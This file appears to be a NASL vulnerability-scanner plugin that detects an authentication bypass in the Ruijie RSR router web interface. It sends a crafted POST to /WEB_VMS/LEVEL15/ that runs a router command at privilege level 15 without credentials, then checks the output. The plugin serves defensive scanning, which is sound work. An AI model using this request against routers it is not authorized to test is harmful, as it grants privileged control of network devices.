############################################################
# Author: shiyunshu
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799200);
 name = "Ruijie RSR router - web authentication bypass";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family("CNLocal");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"risk_factor", value:"Medium");
 script_set_attribute(attribute:"description", value:"Ruijie RSR router web login interface sends show version and other information to the switch through POST, and returns to the web operation interface with LEVEL 15 permission.");
 script_set_attribute(attribute:"solution", value:"It is recommended to filter the data entered by users.");
 script_end_attributes();
 script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
 script_require_ports("Services/www", 80);
 exit(0);
}


#
# The script code starts here
#
include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


function check_vuln(port){
	if ( !get_port_state(port) ) exit(0);
	url = string("/WEB_VMS/LEVEL15/");
	req = http_send_recv3(method: "POST", port: port, item: url,  add_headers: make_array("User_Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0","Cookie", "currentURL=; auth=; user=; c_name=" ),data: "command=show version&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.");
	if( req[2] == NULL) exit(0);
	con = url + req[1] + req[2];
	if( "200 ">< req[0] && '><H1>WebCLI:</H1><PRE><HR>
<FORM METHOD=POST ACTION="/WEB_VMS/LEVEL15/"' >< req[2] && ">Level was: LEVEL15<P>Mode was: /exec/<P>Command was: show version" >< req[2] && "System serial number    :" >< req[2]){
	  	if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
    }
}

function check_vuln_ssl(port){
	if ( !get_port_state(port) ) exit(0);
	url = string("/WEB_VMS/LEVEL15/");
	res = http_send_recv3(method: "POST", port: port, item: url,  add_headers: make_array("User_Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0","Cookie", "currentURL=; auth=; user=; c_name=" ),data: "command=show version&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.");
	req = http_last_sent_request();
    ssl_req = https_req_get(port:port , request:req);
	if( ssl_req == NULL) exit(0);
	con = url + ssl_req;
	if( "200 O"><ssl_req && '><H1>WebCLI:</H1><PRE><HR>
<FORM METHOD=POST ACTION="/WEB_VMS/LEVEL15/"'><ssl_req && ">Level was: LEVEL15<P>Mode was: /exec/<P>Command was: show version"><ssl_req && "System serial number    :"><ssl_req){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}


##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}
